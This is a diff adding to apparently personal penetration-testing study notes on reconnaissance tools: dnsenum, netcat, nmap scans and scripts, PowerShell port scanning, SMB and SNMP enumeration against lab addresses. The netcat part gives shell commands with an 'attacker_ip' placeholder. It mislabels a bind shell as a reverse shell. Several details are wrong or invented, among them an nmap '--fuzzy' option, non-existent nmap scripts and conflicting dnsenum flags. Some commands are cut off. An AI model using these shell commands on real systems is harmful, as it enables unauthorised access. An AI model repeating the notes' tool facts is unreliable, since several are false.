@@ -78,16 +78,267 @@ the strongest parameters you can consider using:
     
 18. **-A (All)**: Combine multiple types of enumeration (e.g., standard, reverse, brute force) in a single scan.
 
+  
+
+**DNSENUM**
+
+- `-w`: Specify a custom wordlist for subdomain enumeration.
+- `-l`: Set the maximum length of brute force subdomains.
+- `-L`: Provide a list of characters to use for brute forcing.
+- `-f`: Fetch additional information about discovered subdomains.
+- `-r`: Perform reverse DNS lookups on IP addresses.
+- `-n`: Use a specific DNS server for enumeration.
+- `-o`: Save results to a file.
+- `-t`: Specify the number of threads for faster enumeration.
+- `-p`: Format the output for easier reading.
+- `-g`: Use Google dorks for subdomain enumeration.
+- `-i`: Attempt to gather additional information about subdomains.
+- `-r`: Perform recursive subdomain enumeration.
+
+**NETCAT**
+1. **Basic Network Scanning:**
+    - `-v` (Verbose): Provides detailed information about the connection.
+    - `-n` (Numeric-only IP addresses): Prevents DNS resolution for faster scans.
+    - `-z` (Zero-I/O mode): Checks if a port is open without sending any data.
+    - `-w` (Timeout): Sets a timeout for connection attempts.
+2. **Port Scanning:**
+    - `-z` (Zero-I/O mode): Use it for quick port scanning.
+    - `-v` (Verbose): Provides more detailed output.
+3. **Banner Grabbing:**
+    - Connect to a service and observe the banner to identify the service version.
+4. **File Transfer:**
+    - Use `nc` in combination with pipes (`|`) to transfer files between systems.
+    - Example: `nc -l -p 12345 < file_to_send` on one system and `nc destination_ip 12345 > received_file` on another.
+5. **Reverse Shell:**
+    - Create a reverse shell to gain access to a remote system.
+    - On the attacker machine: `nc -l -p 12345 -e /bin/bash`
+    - On the victim machine: `nc attacker_ip 12345`
+6. **Listening Mode:*
+    - `-l` (Listen mode): Used for listening on a specific port.
+    - `-p` (Port): Specify the port to listen on.
+7. **UDP Mode:**
+    - `-u` (UDP mode): Use for UDP connections instead of TCP.
+8. **Source Port Spoofing:**
+    - `-s` (Source port): Spoof the source port for evasion purposes.
+9. **Timeouts:**
+    - `-w` (Timeout): Set a timeout for connections.
+    - `-z` (Zero-I/O mode): Use in combination with a timeout to quickly check if a port is open.
+10. **Verbose Output:**
+    - `-v` (Verbose): Provides detailed information about the connection.
+11. **Listening on All Interfaces:**
+    - `-k` (Keep listening): Forces `nc` to keep listening for incoming connections even after one connection is closed.
+    - `-s` (Bind source address): Specify a source IP address to listen on a specific network interface.
+12. **Firewall Evasion:**
+    - Use options like `-e` to specify an executable to run upon connection, which can help bypass firewalls and intrusion detection systems.
 
 **NMAP**
-──(hollacosta㉿kali1)-[~]
-└─$ sudo nmap -sS 192.168.234.52                                                  ---- STEALTH SCAN
+└─$ sudo nmap -sS 192.168.234.52                                                                        ---- STEALTH SCAN
 
-┌──(hollacosta㉿kali1)-[~]
 └─$ sudo nmap -sT 192.168.234.52
-Starting Nmap 7.91 ( https://nmap.org ) at 2023-09-25 06:57 EDT ---- TCP FULL CONNECT SCAN
+Starting Nmap 7.91 ( https://nmap.org ) at 2023-09-25 06:57 EDT      ---- TCP FULL CONNECT SCAN
 
 ┌──(hollacosta㉿kali1)-[~]
-└─$ sudo nmap -sU 192.168.234.52                                                 ---- UDP Scan
+└─$ sudo nmap -sU 192.168.234.52                                                                               ---- UDP SCAN
 
 
+1. **Basic Scan Types:**
+    - `-sS` (TCP SYN Scan): Stealthy scan that sends SYN packets to determine open ports.
+    - `-sT` (TCP Connect Scan): Completes the TCP three-way handshake to determine open ports.
+    - `-sU` (UDP Scan): Scans for open UDP ports.
+    - `-sV` (Service Version Detection): Attempts to determine the version of services running on open ports.
+2. **Timing Options:**
+    - `-T` (Timing Template): Adjusts scan speed and aggressiveness (e.g., `-T4` for aggressive).
+    - `--max-rtt-timeout` and `--max-retries`: Fine-tune timing settings.
+3. **Output Options:**
+    - `-oA` (Output to All Formats): Generates output in multiple formats (grepable, XML, and normal).
+    - `-oN` (Normal Output): Outputs results in a human-readable format.
+    - `-oX` (XML Output): Useful for parsing results with other tools.
+4. **Host Discovery:**
+    - `-sn` (Ping Scan): Quickly identifies live hosts using ICMP echo requests.
+    - `-Pn` (No Ping): Skips host discovery and assumes all hosts are up.
+5. **Scripting Engine:**
+    - `--script` (Nmap Scripting Engine): Run custom NSE scripts for additional vulnerability scanning or information gathering.
+6. **Port Specification:**
+    - `-p` (Port Range): Specify the ports to scan (e.g., `-p 1-1000`).
+7. **OS Detection:**
+    - `-O` (OS Detection): Attempts to identify the operating system of target hosts.
+8. **Aggressive Scanning:**
+    - `-A` (Aggressive Scan): Combines various scan options (service version detection, OS detection, and more).
+9. **Firewall and IDS Evasion:**
+    - `--fuzzy` (Fuzzy Scan): Helps bypass some packet filtering devices.
+    - `--data-length` and `--ip-options`: Customize packet headers to evade filters.
+10. **Output Analysis:**
+    - `--script-args` (Script Arguments): Customize NSE script behavior.
+    - `--script-updatedb` (Update NSE scripts): Keep NSE scripts up to date.
+11. **IPv6 Scanning:**
+    - `-6` (IPv6 Scan): Perform scans on IPv6 networks.
+12. **Timing and Rate Control:**
+    - `--min-rate` and `--max-rate`: Control the scan rate.
+    - `--max-scan-delay` and `--max-retries`: Adjust timeouts and retries.
+13. **Aggressive Timing:**
+    - `-T4` or `-T5`: Use aggressive timing templates when speed is crucial (be cautious not to overwhelm the network).
+14. **Output Format Selection:**
+    - `--open` and `--output-format`: Filter and format output based on open ports.
+
+**NMAP SCRIPTS**
+1. **Vulnerability Scanning:**
+    - `vulners`: This script checks for known vulnerabilities in services and software on the target system by querying the Vulners database.
+2. **Service Enumeration:** 
+    - `enum4linux`: This script is used for gathering information about Windows systems, including shares, users, and more.
+    - `http-enum`: It enumerates directories and files on web servers, helping you find hidden content.
+    - `smtp-enum-users`: This script tries to enumerate valid email addresses on a mail server.
+3. **Exploitation and Brute Force:**    
+    - `smb-vuln*`: These scripts check for specific SMB (Server Message Block) vulnerabilities.
+    - `ftp-brute`: It performs brute-force attacks against FTP servers.
+    - `ssh-brute`: This script brute forces SSH login credentials.
+4. **SSL/TLS Vulnerabilities:**
+    - `ssl-heartbleed`: Checks for the Heartbleed vulnerability in SSL/TLS implementations.
+    - `ssl-poodle`: Identifies SSLv3 vulnerabilities like the POODLE attack.
+5. **Database Scanning:**
+    - `mysql-*`, `ms-sql-*`, `mongodb-*`: These scripts are used to enumerate and gather information about various database services.
+6. **Information Gathering:**
+    - `dns-zone-transfer`: Attempts to perform a DNS zone transfer, which can reveal internal domain information.
+    - `snmp-brute`: Brute forces SNMP (Simple Network Management Protocol) community strings.
+    - `sip-brute`: Brute forces SIP (Session Initiation Protocol) credentials.
+7. **Firewall and IDS Evasion:**
+    - `ftp-bounce`: Checks if the FTP server allows PORT or PASV command bounce attacks.
+    - `http-shellshock`: Detects the Shellshock vulnerability in HTTP servers.
+    - `scanme.nse`: It scans the target with a variety of common scan techniques to check how well it detects and responds to scans.
+    
+┌──(hollacosta㉿kali1)-[~]
+└─$ sudo nmap -p 80 192.168.234.1-253 -oG web-sweep.txt                     ---- WEB SWEEP ON PORT
+[sudo] password for hollacosta: 
+Starting Nmap 7.91 ( https://nmap.org ) at 2023-09-25 07:39 EDT
+Nmap scan report for 192.168.234.52
+Host is up (0.030s latency).
+
+PORT   STATE  SERVICE
+80/tcp closed http
+
+Nmap done: 253 IP addresses (1 host up) scanned in 36.66 seconds
+┌──(hollacosta㉿kali1)-[~]
+└─$ grep open web-sweep.txt| cut -d " " -f2                                -----
+┌──(hollacosta㉿kali1)-[~]
+└─$ cat web-sweep.txt             
+
+Host: 192.168.234.52 () Status: Up
+Host: 192.168.234.52 () Ports: 80/closed/tcp//http///
+
+┌──(hollacosta㉿kali1)-[~]
+└─$ nmap -v -sn 192.168.234.1-253 -oG ping-sweep.txt                                   ---- NETWORK SWEEP
+Starting Nmap 7.91 ( https://nmap.org ) at 2023-09-25 07:45 EDT
+Initiating Ping Scan at 07:45
+Scanning 253 hosts [2 ports/host]
+Completed Ping Scan at 07:45, 7.29s elapsed (253 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 07:45
+Completed Parallel DNS resolution of 1 host. at 07:45, 0.01s elapsed
+
+
+┌──(hollacosta㉿kali1)-[/usr/share/nmap]
+└─$ sudo nmap -O 192.168.234.52 --osscan-guess         
+[sudo] password for hollacosta: 
+
+┌──(hollacosta㉿kali1)-[/usr/share/nmap]
+└─$ nmap -sT -A 192.168.234.52         
+
+**PORT SCANNING SMB VIA POWERSHELL**
+Test-NetConnection -Port 445 192.168.50.151
+
+**AUTOMATING A POWERSHELL PORTSCANNING**
+1..1024 | % {echo ((New-Object Net.Sockets.TcpClient).Connect("192.168.248.52", $_)) "TCP port $_ is open"} 2>$null
+
+**SMB ENUMERATION**
+nmap -v -p 139,445 -oG smb.txt 192.168.234.      
+- `-v`: It makes the tool provide more details during the scan.
+- `-p 139,445`: It checks if ports 139 and 445 are open on a device. These ports are often used for file sharing on Windows computers.
+- `-oG smb.txt`: The results of the scan will be saved in a file named "smb.txt."
+- `192.168.234`: This is the address of the device you want to scan (it should be complete, as the provided address ends with a dot).
+
+┌──(hollacosta㉿kali1)-[~]                                              ---- TO FIND ALL THE SMBs listed
+└─$ ls -l /usr/share/nmap/scripts/smb*
+-rw-r--r-- 1 root root  3355 Oct 12  2020 /usr/share/nmap/scripts/smb2-capabilities.nse
+-rw-r--r-- 1 root root  3075 Oct 12  2020 /usr/share/nmap/scripts/smb2-security-mode.nse
+
+**SNMP**
+1. **System Information (SNMPv2-MIB::sysDescr):**
+    - OID: 1.3.6.1.2.1.1.1.0
+    - Command: `snmpwalk -v2c -c public <target_IP> SNMPv2-MIB::sysDescr`
+2. **System Name (SNMPv2-MIB::sysName):**
+    - OID: 1.3.6.1.2.1.1.5.0
+    - Command: `snmpwalk -v2c -c public <target_IP> SNMPv2-MIB::sysName`
+3. **Network Interfaces (IF-MIB::ifDescr):**
+    - OID: 1.3.6.1.2.1.2.2.1.2
+    - Command: `snmpwalk -v2c -c public <target_IP> IF-MIB::ifDescr`
+4. **Running Processes (HOST-RESOURCES-MIB::hrSWRunName):**
+    - OID: 1.3.6.1.2.1.25.4.2.1.2
+    - Command: `snmpwalk -v2c -c public <target_IP> HOST-RESOURCES-MIB::hrSWRunName`
+5. **Listening Ports (TCP-MIB::tcpConnLocalAddress and TCP-MIB::tcpConnLocalPort):**
+    - OIDs:
+        - Local Address: 1.3.6.1.2.1.6.19.1.2
+        - Local Port: 1.3.6.1.2.1.6.19.1.3
+    - Command (for local address): `snmpwalk -v2c -c public <target_IP> TCP-MIB::tcpConnLocalAddress`
+    - Command (for local port): `snmpwalk -v2c -c public <target_IP> TCP-MIB::tcpConnLocalPort`
+6. **Routing Table (IP-MIB::ipRouteDest and IP-MIB::ipRouteNextHop):**
+    - OIDs:
+        - Destination: 1.3.6.1.2.1.4.21.1.1
+        - Next Hop: 1.3.6.1.2.1.4.21.1.7
+    - Command (for destination): `snmpwalk -v2c -c public <target_IP> IP-MIB::ipRouteDest`
+    - Command (for next hop): `snmpwalk -v2c -c public <target_IP> IP-MIB::ipRouteNextHop`
+7. **System Uptime (DISMAN-EVENT-MIB::sysUpTimeInstance):**
+    - OID: 1.3.6.1.2.1.1.3.0
+    - Command: `snmpwalk -v2c -c public <target_IP> DISMAN-EVENT-MIB::sysUpTimeInstance`
+
+
+|OID|Description|
+|---|---|
+|1.3.6.1.2.1.1.1.0|System Description (sysDescr)|
+|1.3.6.1.2.1.1.2.0|System Object ID (sysObjectID)|
+|1.3.6.1.2.1.1.5.0|System Name (sysName)|
+|1.3.6.1.2.1.1.6.0|System Location (sysLocation)|
+|1.3.6.1.2.1.1.4.0|System Contact (sysContact)|
+|1.3.6.1.2.1.1.7.0|System Services (sysServices)|
+|1.3.6.1.2.1.2.2.1.2|Interface Description (ifDescr)|
+|1.3.6.1.2.1.2.2.1.3|Interface Type (ifType)|
+|1.3.6.1.2.1.2.2.1.5|Interface Speed (ifSpeed)|
+|1.3.6.1.2.1.2.2.1.6|Interface Physical Address (ifPhysAddress)|
+|1.3.6.1.2.1.2.2.1.7|Interface Admin Status (ifAdminStatus)|
+|1.3.6.1.2.1.2.2.1.8|Interface Oper Status (ifOperStatus)|
+|1.3.6.1.2.1.2.2.1.9|Interface Last Change (ifLastChange)|
+|1.3.6.1.2.1.2.2.1.10|Interface In Octets (ifInOctets)|
+|1.3.6.1.2.1.2.2.1.11|Interface In Ucast Packets (ifInUcastPkts)|
+|1.3.6.1.2.1.2.2.1.12|Interface In Errors (ifInErrors)|
+|1.3.6.1.2.1.2.2.1.13|Interface In Discards (ifInDiscards)|
+|1.3.6.1.2.1.2.2.1.14|Interface In Unknown Protos (ifInUnknownProtos)|
+|1.3.6.1.2.1.2.2.1.15|Interface Out Octets (ifOutOctets)|
+|1.3.6.1.2.1.2.2.1.16|Interface Out Ucast Packets (ifOutUcastPkts)|
+|1.3.6.1.2.1.2.2.1.17|Interface Out Errors (ifOutErrors)|
+|1.3.6.1.2.1.2.2.1.18|Interface Out Discards (ifOutDiscards)|
+|1.3.6.1.2.1.2.2.1.19|Interface Out Queue Length (ifOutQLen)|
+|1.3.6.1.2.1.25.2.3.1.5|Storage Name (hrStorageDescr)|
+|1.3.6.1.2.1.25.2.3.1.6|Storage Type (hrStorageType)|
+|1.3.6.1.2.1.25.2.3.1.7|Storage Allocation Units (hrStorageAllocationUnits)|
+|1.3.6.1.2.1.25.2.3.1.8|Storage Size (hrStorageSize)|
+|1.3.6.1.2.1.25.2.3.1.9|Storage Used (hrStorageUsed)|
+|1.3.6.1.2.1.25.2.3.1.10|Storage Allocation Failures (hrStorageAllocationFailures)|
+|1.3.6.1.2.1.25.1.6.0|System Uptime (sysUp|
+
+|   |   |
+|---|---|
+|1.3.6.1.2.1.25.1.6.0|System Processes|
+|1.3.6.1.2.1.25.4.2.1.2|Running Programs|
+|1.3.6.1.2.1.25.4.2.1.4|Processes Path|
+|1.3.6.1.2.1.25.2.3.1.4|Storage Units|
+|1.3.6.1.2.1.25.6.3.1.2|Software Name|
+|1.3.6.1.4.1.77.1.2.25|User Accounts|
+|1.3.6.1.2.1.6.13.1.3|TCP Local Ports|
+
+
+
+kali@kali:~$ sudo nmap -sU --open -p 161 192.168.50.1-254 -oG open-snmp.txt
+kali@kali:~$ echo public > community
+kali@kali:~$ echo private >> community
+kali@kali:~$ echo manager >> community
+
+for ip in $(seq 1 254); do echo 192.168.50.$ip; done > ips
+kali@kali:~$ onesixtyone -c community -i 
+public -v1 -t 10 192.168.50.151
